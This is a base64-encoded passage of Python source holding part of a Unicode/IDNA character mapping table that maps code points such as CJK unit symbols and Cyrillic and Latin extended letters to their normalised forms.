DcsIFwnTVwnLCBcJ2diXCcpLFxuICAgICgweDMzODgsIFwnTVwnLCBcJ2NhbFwnKSxcbiAgICAoMHgzMzg5LCBcJ01cJywgXCdrY2FsXCcpLFxuICAgICgweDMzOEEsIFwnTVwnLCBcJ3BmXCcpLFxuICAgICgweDMzOEIsIFwnTVwnLCBcJ25mXCcpLFxuICAgICgweDMzOEMsIFwnTVwnLCBcJ1x4Y2VceGJjZlwnKSxcbiAgICAoMHgzMzhELCBcJ01cJywgXCdceGNlXHhiY2dcJyksXG4gICAgKDB4MzM4RSwgXCdNXCcsIFwnbWdcJyksXG4gICAgKDB4MzM4RiwgXCdNXCcsIFwna2dcJyksXG4gICAgKDB4MzM5MCwgXCdNXCcsIFwnaHpcJyksXG4gICAgKDB4MzM5MSwgXCdNXCcsIFwna2h6XCcpLFxuICAgICgweDMzOTIsIFwnTVwnLCBcJ21oelwnKSxcbiAgICAoMHgzMzkzLCBcJ01cJywgXCdnaHpcJyksXG4gICAgKDB4MzM5NCwgXCdNXCcsIFwndGh6XCcpLFxuICAgICgweDMzOTUsIFwnTVwnLCBcJ1x4Y2VceGJjbFwnKSxcbiAgICAoMHgzMzk2LCBcJ01cJywgXCdtbFwnKSxcbiAgICAoMHgzMzk3LCBcJ01cJywgXCdkbFwnKSxcbiAgICAoMHgzMzk4LCBcJ01cJywgXCdrbFwnKSxcbiAgICAoMHgzMzk5LCBcJ01cJywgXCdmbVwnKSxcbiAgICAoMHgzMzlBLCBcJ01cJywgXCdubVwnKSxcbiAgICAoMHgzMzlCLCBcJ01cJywgXCdceGNlXHhiY21cJyksXG4gICAgKDB4MzM5QywgXCdNXCcsIFwnbW1cJyksXG4gICAgKDB4MzM5RCwgXCdNXCcsIFwnY21cJyksXG4gICAgKDB4MzM5RSwgXCdNXCcsIFwna21cJyksXG4gICAgKDB4MzM5RiwgXCdNXCcsIFwnbW0yXCcpLFxuICAgICgweDMzQTAsIFwnTVwnLCBcJ2NtMlwnKSxcbiAgICAoMHgzM0ExLCBcJ01cJywgXCdtMlwnKSxcbiAgICAoMHgzM0EyLCBcJ01cJywgXCdrbTJcJyksXG4gICAgKDB4MzNBMywgXCdNXCcsIFwnbW0zXCcpLFxuICAgICgweDMzQTQsIFwnTVwnLCBcJ2NtM1wnKSxcbiAgICAoMHgzM0E1LCBcJ01cJywgXCdtM1wnKSxcbiAgICAoMHgzM0E2LCBcJ01cJywgXCdrbTNcJyksXG4gICAgKDB4MzNBNywgXCdNXCcsIFwnbVx4ZTJceDg4XHg5NXNcJyksXG4gICAgKDB4MzNBOCwgXCdNXCcsIFwnbVx4ZTJceDg4XHg5NXMyXCcpLFxuICAgICgweDMzQTksIFwnTVwnLCBcJ3BhXCcpLFxuICAgICgweDMzQUEsIFwnTVwnLCBcJ2twYVwnKSxcbiAgICAoMHgzM0FCLCBcJ01cJywgXCdtcGFcJyksXG4gICAgKDB4MzNBQywgXCdNXCcsIFwnZ3BhXCcpLFxuICAgICgweDMzQUQsIFwnTVwnLCBcJ3JhZFwnKSxcbiAgICAoMHgzM0FFLCBcJ01cJywgXCdyYWRceGUyXHg4OFx4OTVzXCcpLFxuICAgICgweDMzQUYsIFwnTVwnLCBcJ3JhZFx4ZTJceDg4XHg5NXMyXCcpLFxuICAgICgweDMzQjAsIFwnTVwnLCBcJ3BzXCcpLFxuICAgICgweDMzQjEsIFwnTVwnLCBcJ25zXCcpLFxuICAgICgweDMzQjIsIFwnTVwnLCBcJ1x4Y2VceGJjc1wnKSxcbiAgICAoMHgzM0IzLCBcJ01cJywgXCdtc1wnKSxcbiAgICAoMHgzM0I0LCBcJ01cJywgXCdwdlwnKSxcbiAgICAoMHgzM0I1LCBcJ01cJywgXCdudlwnKSxcbiAgICAoMHgzM0I2LCBcJ01cJywgXCdceGNlXHhiY3ZcJyksXG4gICAgKDB4MzNCNywgXCdNXCcsIFwnbXZcJyksXG4gICAgKDB4MzNCOCwgXCdNXCcsIFwna3ZcJyksXG4gICAgKDB4MzNCOSwgXCdNXCcsIFwnbXZcJyksXG4gICAgKDB4MzNCQSwgXCdNXCcsIFwncHdcJyksXG4gICAgKDB4MzNCQiwgXCdNXCcsIFwnbndcJyksXG4gICAgKDB4MzNCQywgXCdNXCcsIFwnXHhjZVx4YmN3XCcpLFxuICAgICgweDMzQkQsIFwnTVwnLCBcJ213XCcpLFxuICAgICgweDMzQkUsIFwnTVwnLCBcJ2t3XCcpLFxuICAgICgweDMzQkYsIFwnTVwnLCBcJ213XCcpLFxuICAgICgweDMzQzAsIFwnTVwnLCBcJ2tceGNmXHg4OVwnKSxcbiAgICAoMHgzM0MxLCBcJ01cJywgXCdtXHhjZlx4ODlcJyksXG4gICAgKDB4MzNDMiwgXCdYXCcpLFxuICAgICgweDMzQzMsIFwnTVwnLCBcJ2JxXCcpLFxuICAgICgweDMzQzQsIFwnTVwnLCBcJ2NjXCcpLFxuICAgICgweDMzQzUsIFwnTVwnLCBcJ2NkXCcpLFxuICAgICgweDMzQzYsIFwnTVwnLCBcJ2NceGUyXHg4OFx4OTVrZ1wnKSxcbiAgICAoMHgzM0M3LCBcJ1hcJyksXG4gICAgKDB4MzNDOCwgXCdNXCcsIFwnZGJcJyksXG4gICAgKDB4MzNDOSwgXCdNXCcsIFwnZ3lcJyksXG4gICAgKDB4MzNDQSwgXCdNXCcsIFwnaGFcJyksXG4gICAgKDB4MzNDQiwgXCdNXCcsIFwnaHBcJyksXG4gICAgKDB4MzNDQywgXCdNXCcsIFwnaW5cJyksXG4gICAgKDB4MzNDRCwgXCdNXCcsIFwna2tcJyksXG4gICAgKDB4MzNDRSwgXCdNXCcsIFwna21cJyksXG4gICAgKDB4MzNDRiwgXCdNXCcsIFwna3RcJyksXG4gICAgKDB4MzNEMCwgXCdNXCcsIFwnbG1cJyksXG4gICAgKDB4MzNEMSwgXCdNXCcsIFwnbG5cJyksXG4gICAgKDB4MzNEMiwgXCdNXCcsIFwnbG9nXCcpLFxuICAgICgweDMzRDMsIFwnTVwnLCBcJ2x4XCcpLFxuICAgICgweDMzRDQsIFwnTVwnLCBcJ21iXCcpLFxuICAgICgweDMzRDUsIFwnTVwnLCBcJ21pbFwnKSxcbiAgICAoMHgzM0Q2LCBcJ01cJywgXCdtb2xcJyksXG4gICAgKDB4MzNENywgXCdNXCcsIFwncGhcJyksXG4gICAgKDB4MzNEOCwgXCdYXCcpLFxuICAgICgweDMzRDksIFwnTVwnLCBcJ3BwbVwnKSxcbiAgICAoMHgzM0RBLCBcJ01cJywgXCdwclwnKSxcbiAgICAoMHgzM0RCLCBcJ01cJywgXCdzclwnKSxcbiAgICAoMHgzM0RDLCBcJ01cJywgXCdzdlwnKSxcbiAgICAoMHgzM0RELCBcJ01cJywgXCd3YlwnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzM1KCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHgzM0RFLCBcJ01cJywgXCd2XHhlMlx4ODhceDk1bVwnKSxcbiAgICAoMHgzM0RGLCBcJ01cJywgXCdhXHhlMlx4ODhceDk1bVwnKSxcbiAgICAoMHgzM0UwLCBcJ01cJywgXCcxXHhlNlx4OTdceGE1XCcpLFxuICAgICgweDMzRTEsIFwnTVwnLCBcJzJceGU2XHg5N1x4YTVcJyksXG4gICAgKDB4MzNFMiwgXCdNXCcsIFwnM1x4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0UzLCBcJ01cJywgXCc0XHhlNlx4OTdceGE1XCcpLFxuICAgICgweDMzRTQsIFwnTVwnLCBcJzVceGU2XHg5N1x4YTVcJyksXG4gICAgKDB4MzNFNSwgXCdNXCcsIFwnNlx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0U2LCBcJ01cJywgXCc3XHhlNlx4OTdceGE1XCcpLFxuICAgICgweDMzRTcsIFwnTVwnLCBcJzhceGU2XHg5N1x4YTVcJyksXG4gICAgKDB4MzNFOCwgXCdNXCcsIFwnOVx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0U5LCBcJ01cJywgXCcxMFx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0VBLCBcJ01cJywgXCcxMVx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0VCLCBcJ01cJywgXCcxMlx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0VDLCBcJ01cJywgXCcxM1x4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0VELCBcJ01cJywgXCcxNFx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0VFLCBcJ01cJywgXCcxNVx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0VGLCBcJ01cJywgXCcxNlx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0YwLCBcJ01cJywgXCcxN1x4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0YxLCBcJ01cJywgXCcxOFx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0YyLCBcJ01cJywgXCcxOVx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0YzLCBcJ01cJywgXCcyMFx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0Y0LCBcJ01cJywgXCcyMVx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0Y1LCBcJ01cJywgXCcyMlx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0Y2LCBcJ01cJywgXCcyM1x4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0Y3LCBcJ01cJywgXCcyNFx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0Y4LCBcJ01cJywgXCcyNVx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0Y5LCBcJ01cJywgXCcyNlx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0ZBLCBcJ01cJywgXCcyN1x4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0ZCLCBcJ01cJywgXCcyOFx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0ZDLCBcJ01cJywgXCcyOVx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0ZELCBcJ01cJywgXCczMFx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0ZFLCBcJ01cJywgXCczMVx4ZTZceDk3XHhhNVwnKSxcbiAgICAoMHgzM0ZGLCBcJ01cJywgXCdnYWxcJyksXG4gICAgKDB4MzQwMCwgXCdWXCcpLFxuICAgICgweEE0OEQsIFwnWFwnKSxcbiAgICAoMHhBNDkwLCBcJ1ZcJyksXG4gICAgKDB4QTRDNywgXCdYXCcpLFxuICAgICgweEE0RDAsIFwnVlwnKSxcbiAgICAoMHhBNjJDLCBcJ1hcJyksXG4gICAgKDB4QTY0MCwgXCdNXCcsIFwnXHhlYVx4OTlceDgxXCcpLFxuICAgICgweEE2NDEsIFwnVlwnKSxcbiAgICAoMHhBNjQyLCBcJ01cJywgXCdceGVhXHg5OVx4ODNcJyksXG4gICAgKDB4QTY0MywgXCdWXCcpLFxuICAgICgweEE2NDQsIFwnTVwnLCBcJ1x4ZWFceDk5XHg4NVwnKSxcbiAgICAoMHhBNjQ1LCBcJ1ZcJyksXG4gICAgKDB4QTY0NiwgXCdNXCcsIFwnXHhlYVx4OTlceDg3XCcpLFxuICAgICgweEE2NDcsIFwnVlwnKSxcbiAgICAoMHhBNjQ4LCBcJ01cJywgXCdceGVhXHg5OVx4ODlcJyksXG4gICAgKDB4QTY0OSwgXCdWXCcpLFxuICAgICgweEE2NEEsIFwnTVwnLCBcJ1x4ZWFceDk5XHg4YlwnKSxcbiAgICAoMHhBNjRCLCBcJ1ZcJyksXG4gICAgKDB4QTY0QywgXCdNXCcsIFwnXHhlYVx4OTlceDhkXCcpLFxuICAgICgweEE2NEQsIFwnVlwnKSxcbiAgICAoMHhBNjRFLCBcJ01cJywgXCdceGVhXHg5OVx4OGZcJyksXG4gICAgKDB4QTY0RiwgXCdWXCcpLFxuICAgICgweEE2NTAsIFwnTVwnLCBcJ1x4ZWFceDk5XHg5MVwnKSxcbiAgICAoMHhBNjUxLCBcJ1ZcJyksXG4gICAgKDB4QTY1MiwgXCdNXCcsIFwnXHhlYVx4OTlceDkzXCcpLFxuICAgICgweEE2NTMsIFwnVlwnKSxcbiAgICAoMHhBNjU0LCBcJ01cJywgXCdceGVhXHg5OVx4OTVcJyksXG4gICAgKDB4QTY1NSwgXCdWXCcpLFxuICAgICgweEE2NTYsIFwnTVwnLCBcJ1x4ZWFceDk5XHg5N1wnKSxcbiAgICAoMHhBNjU3LCBcJ1ZcJyksXG4gICAgKDB4QTY1OCwgXCdNXCcsIFwnXHhlYVx4OTlceDk5XCcpLFxuICAgICgweEE2NTksIFwnVlwnKSxcbiAgICAoMHhBNjVBLCBcJ01cJywgXCdceGVhXHg5OVx4OWJcJyksXG4gICAgKDB4QTY1QiwgXCdWXCcpLFxuICAgICgweEE2NUMsIFwnTVwnLCBcJ1x4ZWFceDk5XHg5ZFwnKSxcbiAgICAoMHhBNjVELCBcJ1ZcJyksXG4gICAgKDB4QTY1RSwgXCdNXCcsIFwnXHhlYVx4OTlceDlmXCcpLFxuICAgICgweEE2NUYsIFwnVlwnKSxcbiAgICAoMHhBNjYwLCBcJ01cJywgXCdceGVhXHg5OVx4YTFcJyksXG4gICAgKDB4QTY2MSwgXCdWXCcpLFxuICAgICgweEE2NjIsIFwnTVwnLCBcJ1x4ZWFceDk5XHhhM1wnKSxcbiAgICAoMHhBNjYzLCBcJ1ZcJyksXG4gICAgKDB4QTY2NCwgXCdNXCcsIFwnXHhlYVx4OTlceGE1XCcpLFxuICAgICgweEE2NjUsIFwnVlwnKSxcbiAgICAoMHhBNjY2LCBcJ01cJywgXCdceGVhXHg5OVx4YTdcJyksXG4gICAgKDB4QTY2NywgXCdWXCcpLFxuICAgICgweEE2NjgsIFwnTVwnLCBcJ1x4ZWFceDk5XHhhOVwnKSxcbiAgICAoMHhBNjY5LCBcJ1ZcJyksXG4gICAgKDB4QTY2QSwgXCdNXCcsIFwnXHhlYVx4OTlceGFiXCcpLFxuICAgICgweEE2NkIsIFwnVlwnKSxcbiAgICAoMHhBNjZDLCBcJ01cJywgXCdceGVhXHg5OVx4YWRcJyksXG4gICAgKDB4QTY2RCwgXCdWXCcpLFxuICAgICgweEE2ODAsIFwnTVwnLCBcJ1x4ZWFceDlhXHg4MVwnKSxcbiAgICAoMHhBNjgxLCBcJ1ZcJyksXG4gICAgKDB4QTY4MiwgXCdNXCcsIFwnXHhlYVx4OWFceDgzXCcpLFxuICAgICgweEE2ODMsIFwnVlwnKSxcbiAgICAoMHhBNjg0LCBcJ01cJywgXCdceGVhXHg5YVx4ODVcJyksXG4gICAgKDB4QTY4NSwgXCdWXCcpLFxuICAgICgweEE2ODYsIFwnTVwnLCBcJ1x4ZWFceDlhXHg4N1wnKSxcbiAgICAoMHhBNjg3LCBcJ1ZcJyksXG4gICAgKDB4QTY4OCwgXCdNXCcsIFwnXHhlYVx4OWFceDg5XCcpLFxuICAgICgweEE2ODksIFwnVlwnKSxcbiAgICAoMHhBNjhBLCBcJ01cJywgXCdceGVhXHg5YVx4OGJcJyksXG4gICAgKDB4QTY4QiwgXCdWXCcpLFxuICAgICgweEE2OEMsIFwnTVwnLCBcJ1x4ZWFceDlhXHg4ZFwnKSxcbiAgICAoMHhBNjhELCBcJ1ZcJyksXG4gICAgXVxuXG5kZWYgX3NlZ18zNigpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4QTY4RSwgXCdNXCcsIFwnXHhlYVx4OWFceDhmXCcpLFxuICAgICgweEE2OEYsIFwnVlwnKSxcbiAgICAoMHhBNjkwLCBcJ01cJywgXCdceGVhXHg5YVx4OTFcJyksXG4gICAgKDB4QTY5MSwgXCdWXCcpLFxuICAgICgweEE2OTIsIFwnTVwnLCBcJ1x4ZWFceDlhXHg5M1wnKSxcbiAgICAoMHhBNjkzLCBcJ1ZcJyksXG4gICAgKDB4QTY5NCwgXCdNXCcsIFwnXHhlYVx4OWFceDk1XCcpLFxuICAgICgweEE2OTUsIFwnVlwnKSxcbiAgICAoMHhBNjk2LCBcJ01cJywgXCdceGVhXHg5YVx4OTdcJyksXG4gICAgKDB4QTY5NywgXCdWXCcpLFxuICAgICgweEE2OTgsIFwnTVwnLCBcJ1x4ZWFceDlhXHg5OVwnKSxcbiAgICAoMHhBNjk5LCBcJ1ZcJyksXG4gICAgKDB4QTY5QSwgXCdNXCcsIFwnXHhlYVx4OWFceDliXCcpLFxuICAgICgweEE2OUIsIFwnVlwnKSxcbiAgICAoMHhBNjlDLCBcJ01cJywgXCdceGQxXHg4YVwnKSxcbiAgICAoMHhBNjlELCBcJ01cJywgXCdceGQxXHg4Y1wnKSxcbiAgICAoMHhBNjlFLCBcJ1ZcJyksXG4gICAgKDB4QTZGOCwgXCdYXCcpLFxuICAgICgweEE3MDAsIFwnVlwnKSxcbiAgICAoMHhBNzIyLCBcJ01cJywgXCdceGVhXHg5Y1x4YTNcJyksXG4gICAgKDB4QTcyMywgXCdWXCcpLFxuICAgICgweEE3MjQsIFwnTVwnLCBcJ1x4ZWFceDljXHhhNVwnKSxcbiAgICAoMHhBNzI1LCBcJ1ZcJyksXG4gICAgKDB4QTcyNiwgXCdNXCcsIFwnXHhlYVx4OWNceGE3XCcpLFxuICAgICgweEE3MjcsIFwnVlwnKSxcbiAgICAoMHhBNzI4LCBcJ01cJywgXCdceGVhXHg5Y1x4YTlcJyksXG4gICAgKDB4QTcyOSwgXCdWXCcpLFxuICAgICgweEE3MkEsIFwnTVwnLCBcJ1x4ZWFceDljXHhhYlwnKSxcbiAgICAoMHhBNzJCLCBcJ1ZcJyksXG4gICAgKDB4QTcyQywgXCdNXCcsIFwnXHhlYVx4OWNceGFkXCcpLFxuICAgICgweEE3MkQsIFwnVlwnKSxcbiAgICAoMHhBNzJFLCBcJ01cJywgXCdceGVhXHg5Y1x4YWZcJyksXG4gICAgKDB4QTcyRiwgXCdWXCcpLFxuICAgICgweEE3MzIsIFwnTVwnLCBcJ1x4ZWFceDljXHhiM1wnKSxcbiAgICAoMHhBNzMzLCBcJ1ZcJyksXG4gICAgKDB4QTczNCwgXCdNXCcsIFwnXHhlYVx4OWNceGI1XCcpLFxuICAgICgweEE3MzUsIFwnVlwnKSxcbiAgICAoMHhBNzM2LCBcJ01cJywgXCdceGVhXHg5Y1x4YjdcJyksXG4gICAgKDB4QTczNywgXCdWXCcpLFxuICAgICgweEE3MzgsIFwnTVwnLCBcJ1x4ZWFceDljXHhiOVwnKSxcbiAgICAoMHhBNzM5LCBcJ1ZcJyksXG4gICAgKDB4QTczQSwgXCdNXCcsIFwnXHhlYVx4OWNceGJiXCcpLFxuICAgICgweEE3M0IsIFwnVlwnKSxcbiAgICAoMHhBNzNDLCBcJ01cJywgXCdceGVhXHg5Y1x4YmRcJyksXG4gICAgKDB4QTczRCwgXCdWXCcpLFxuICAgICgweEE3M0UsIFwnTVwnLCBcJ1x4ZWFceDljXHhiZlwnKSxcbiAgICAoMHhBNzNGLCBcJ1ZcJyksXG4gICAgKDB4QTc0MCwgXCdNXCcsIFwnXHhlYVx4OWRceDgxXCcpLFxuICAgICgweEE3NDEsIFwnVlwnKSxcbiAgICAoMHhBNzQyLCBcJ01cJywgXCdceGVhXHg5ZFx4ODNcJyksXG4gICAgKDB4QTc0MywgXCdWXCcpLFxuICAgICgweEE3NDQsIFwnTVwnLCBcJ1x4ZWFceDlkXHg4NVwnKSxcbiAgICAoMHhBNzQ1LCBcJ1ZcJyksXG4gICAgKDB4QTc0NiwgXCdNXCcsIFwnXHhlYVx4OWRceDg3XCcpLFxuICAgICgweEE3NDcsIFwnVlwnKSxcbiAgICAoMHhBNzQ4LCBcJ01cJywgXCdceGVhXHg5ZFx4ODlcJyksXG4gICAgKDB4QTc0OSwgXCdWXCcpLFxuICAgICgweEE3NEEsIFwnTVwnLCBcJ1x4ZWFceDlkXHg4YlwnKSxcbiAgICAoMHhBNzRCLCBcJ1ZcJyksXG4gICAgKDB4QTc0QywgXCdNXCcsIFwnXHhlYVx4OWRceDhkXCcpLFxuICAgICgweEE3NEQsIFwnVlwnKSxcbiAgICAoMHhBNzRFLCBcJ01cJywgXCdceGVhXHg5ZFx4OGZcJyksXG4gICAgKDB4QTc0RiwgXCdWXCcpLFxuICAgICgweEE3NTAsIFwnTVwnLCBcJ1x4ZWFceDlkXHg5MVwnKSxcbiAgICAoMHhBNzUxLCBcJ1ZcJyksXG4gICAgKDB4QTc1MiwgXCdNXCcsIFwnXHhlYVx4OWRceDkzXCcpLFxuICAgICgweEE3NTMsIFwnVlwnKSxcbiAgICAoMHhBNzU0LCBcJ01cJywgXCdceGVhXHg5ZFx4OTVcJyksXG4gICAgKDB4QTc1NSwgXCdWXCcpLFxuICAgICgweEE3NTYsIFwnTVwnLCBcJ1x4ZWFceDlkXHg5N1wnKSxcbiAgICAoMHhBNzU3LCBcJ1ZcJyksXG4gICAgKDB4QTc1OCwgXCdNXCcsIFwnXHhlYVx4OWRceDk5XCcpLFxuICAgICgweEE3NTksIFwnVlwnKSxcbiAgICAoMHhBNzVBLCBcJ01cJywgXCdceGVhXHg5ZFx4OWJcJyksXG4gICAgKDB4QTc1QiwgXCdWXCcpLFxuICAgICgweEE3NUMsIFwnTVwnLCBcJ1x4ZWFceDlkXHg5ZFwnKSxcbiAgICAoMHhBNzVELCBcJ1ZcJyksXG4gICAgKDB4QTc1RSwgXCdNXCcsIFwnXHhlYVx4OWRceDlmXCcpLFxuICAgICgweEE3NUYsIFwnVlwnKSxcbiAgICAoMHhBNzYwLCBcJ01cJywgXCdceGVhXHg5ZFx4YTFcJyksXG4gICAgKDB4QTc2MSwgXCdWXCcpLFxuICAgICgweEE3NjIsIFwnTVwnLCBcJ1x4ZWFceDlkXHhhM1wnKSxcbiAgICAoMHhBNzYzLCBcJ1ZcJyksXG4gICAgKDB4QTc2NCwgXCdNXCcsIFwnXHhlYVx4OWRceGE1XCcpLFxuICAgICgweEE3NjUsIFwnVlwnKSxcbiAgICAoMHhBNzY2LCBcJ01cJywgXCdceGVhXHg5ZFx4YTdcJyksXG4gICAgKDB4QTc2NywgXCdWXCcpLFxuICAgICgweEE3NjgsIFwnTVwnLCBcJ1x4ZWFceDlkXHhhOVwnKSxcbiAgICAoMHhBNzY5LCBcJ1ZcJyksXG4gICAgKDB4QTc2QSwgXCdNXCcsIFwnXHhlYVx4OWRceGFiXCcpLFxuICAgICgweEE3NkIsIFwnVlwnKSxcbiAgICAoMHhBNzZDLCBcJ01cJywgXCdceGVhXHg5ZFx4YWRcJyksXG4gICAgKDB4QTc2RCwgXCdWXCcpLFxuICAgICgweEE3NkUsIFwnTVwnLCBcJ1x4ZWFceDlkXHhhZlwnKSxcbiAgICAoMHhBNzZGLCBcJ1ZcJyksXG4gICAgKDB4QTc3MCwgXCdNXCcsIFwnXHhlYVx4OWRceGFmXCcpLFxuICAgICgweEE3NzEsIFwnVlwnKSxcbiAgICAoMHhBNzc5LCBcJ01cJywgXCdceGVhXHg5ZFx4YmFcJyksXG4gICAgKDB4QTc3QSwgXCdWXCcpLFxuICAgICgweEE3N0IsIFwnTVwnLCBcJ1x4ZWFceDlkXHhiY1wnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzM3KCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHhBNzdDLCBcJ1ZcJyksXG4gICAgKDB4QTc3RCwgXCdNXCcsIFwnXHhlMVx4YjVceGI5XCcpLFxuICAgICgweEE3N0UsIFwnTVwnLCBcJ1x4ZWFceDlkXHhiZlwnKSxcbiAgICAoMHhBNzdGLCBcJ1ZcJyksXG4gICAgKDB4QTc4MCwgXCdNXCcsIFwnXHhlYVx4OWVceDgxXCcpLFxuICAgICgweEE3ODEsIFwnVlwnKSxcbiAgICAoMHhBNzgyLCBcJ01cJywgXCdceGVhXHg5ZVx4ODNcJyksXG4gICAgKDB4QTc4MywgXCdWXCcpLFxuICAgICgweEE3ODQsIFwnTVwnLCBcJ1x4ZWFceDllXHg4NVwnKSxcbiAgICAoMHhBNzg1LCBcJ1ZcJyksXG4gICAgKDB4QTc4NiwgXCdNXCcsIFwnXHhlYVx4OWVceDg3XCcpLFxuICAgICgweEE3ODcsIFwnVlwnKSxcbiAgICAoMHhBNzhCLCBcJ01cJywgXCdceGVhXHg5ZVx4OGNcJyksXG4gICAgKDB4QTc4QywgXCdWXCcpLFxuICAgICgweEE3OEQsIFwnTVwnLCBcJ1x4YzlceGE1XCcpLFxuICAgICgweEE3OEUsIFwnVlwnKSxcbiAgICAoMHhBNzkwLCBcJ01cJywgXCdceGVhXHg5ZVx4OTFcJyksXG4gICAgKDB4QTc5MSwgXCdWXCcpLFxuICAgICgweEE3OTIsIFwnTVwnLCBcJ1x4ZWFceDllXHg5M1wnKSxcbiAgICAoMHhBNzkzLCBcJ1ZcJyksXG4gICAgKDB4QTc5NiwgXCdNXCcsIFwnXHhlYVx4OWVceDk3XCcpLFxuICAgICgweEE3OTcsIFwnVlwnKSxcbiAgICAoMHhBNzk4LCBcJ01cJywgXCdceGVhXHg5ZVx4OTlcJyksXG4gICAgKDB4QTc5OSwgXCdWXCcpLFxuICAgICgweEE3OUEsIFwnTVwnLCBcJ1x4ZWFceDllXHg5YlwnKSxcbiAgICAoMHhBNzlCLCBcJ1ZcJyksXG4gICAgKDB4QTc5QywgXCdNXCcsIFwnXHhlYVx4OWVceDlkXCcpLFxuICAgICgweEE3OUQsIFwnVlwnKSxcbiAgICAoMHhBNzlFLCBcJ01cJywgXCdceGVhXHg5ZVx4OWZcJyksXG4gICAgKDB4QTc5RiwgXCdWXCcpLFxuICAgICgweEE3QTAsIFwnTVwnLCBcJ1x4ZWFceDllXHhhMVwnKSxcbiAgICAoMHhBN0ExLCBcJ1ZcJyksXG4gICAgKDB4QTdBMiwgXCdNXCcsIFwnXHhlYVx4OWVceGEzXCcpLFxuICAgICgweEE3QTMsIFwnVlwnKSxcbiAgICAoMHhBN0E0LCBcJ01cJywgXCdceGVhXHg5ZVx4YTVcJyksXG4gICAgKDB4QTdBNSwgXCdWXCcpLFxuICAgICgweEE3QTYsIFwnTVwnLCBcJ1x4ZWFceDllXHhhN1wnKSxcbiAgICAoMHhBN0E3LCBcJ1ZcJyksXG4gICAgKDB4QTdBOCwgXCdNXCcsIFwnXHhlYVx4OWVceGE5XCcpLFxuICAgICgweEE3QTksIFwnVlwnKSxcbiAgICAoMHhBN0FBLCBcJ01cJywgXCdceGM5XHhhNlwnKSxcbiAgICAoMHhBN0FCLCBcJ01cJywgXCdceGM5XHg5Y1wnKSxcbiAgICAoMHhBN0FDLCBcJ01cJywgXCdceGM5XHhhMVwnKSxcbiAgICAoMHhBN0FELCBcJ01cJywgXCdceGM5XHhhY1wnKSxcbiAgICAoMHhBN0FFLCBcJ01cJywgXCdceGM5XHhhYVwnKSxcbiAgICAoMHhBN0FGLCBcJ1ZcJyksXG4gICAgKDB4QTdCMCwgXCdNXCcsIFwnXHhjYVx4OWVcJyksXG4gICAgKDB4QTdCMSwgXCdNXCcsIFwnXHhjYVx4ODdcJyksXG4gICAgKDB4QTdCMiwgXCdNXCcsIFwnXHhjYVx4OWRcJyksXG4gICAgKDB4QTdCMywgXCdNXCcsIFwnXHhlYVx4YWRceDkzXCcpLFxuICAgICgweEE3QjQsIFwnTVwnLCBcJ1x4ZWFceDllXHhiNVwnKSxcbiAgICAoMHhBN0I1LCBcJ1ZcJyksXG4gICAgKDB4QTdCNiwgXCdNXCcsIFwnXHhlYVx4OWVceGI3XCcpLFxuICAgICgweEE3QjcsIFwnVlwnKSxcbiAgICAoMHhBN0I4LCBcJ01cJywgXCdceGVhXHg5ZVx4YjlcJyksXG4gICAgKDB4QTdCOSwgXCdWXCcpLFxuICAgICgweEE3QkEsIFwnTVwnLCBcJ1x4ZWFceDllXHhiYlwnKSxcbiAgICAoMHhBN0JCLCBcJ1ZcJyksXG4gICAgKDB4QTdCQywgXCdNXCcsIFwnXHhlYVx4OWVceGJkXCcpLFxuICAgICgweEE3QkQsIFwnVlwnKSxcbiAgICAoMHhBN0JFLCBcJ01cJywgXCdceGVhXHg5ZVx4YmZcJyksXG4gICAgKDB4QTdCRiwgXCdWXCcpLFxuICAgICgweEE3QzAsIFwnTVwnLCBcJ1x4ZWFceDlmXHg4MVwnKSxcbiAgICAoMHhBN0MxLCBcJ1ZcJyksXG4gICAgKDB4QTdDMiwgXCdNXCcsIFwnXHhlYVx4OWZceDgzXCcpLFxuICAgICgweEE3QzMsIFwnVlwnKSxcbiAgICAoMHhBN0M0LCBcJ01cJywgXCdceGVhXHg5ZVx4OTRcJyksXG4gICAgKDB4QTdDNSwgXCdNXCcsIFwnXHhjYVx4ODJcJyksXG4gICAgKDB4QTdDNiwgXCdNXCcsIFwnXHhlMVx4YjZceDhlXCcpLFxuICAgICgweEE3QzcsIFwnTVwnLCBcJ1x4ZWFceDlmXHg4OFwnKSxcbiAgICAoMHhBN0M4LCBcJ1ZcJyksXG4gICAgKDB4QTdDOSwgXCdNXCcsIFwnXHhlYVx4OWZceDhhXCcpLFxuICAgICgweEE3Q0EsIFwnVlwnKSxcbiAgICAoMHhBN0NCLCBcJ1hcJyksXG4gICAg